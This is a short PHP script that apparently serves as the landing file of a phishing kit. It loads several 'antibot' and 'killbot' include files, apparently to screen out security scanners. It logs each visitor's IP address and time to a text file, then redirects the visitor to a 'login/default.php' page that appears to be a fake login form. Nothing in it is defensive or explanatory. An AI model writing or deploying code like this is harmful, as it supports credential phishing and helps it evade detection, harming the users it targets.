<?php


include("antibot.php");
include("antibot2.php");
include("antibot3.php");
include("class.killbot.php");





$ip = getenv("REMOTE_ADDR");
$file = fopen("Visit.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$src="login/default.php";
header("location:$src");
?>
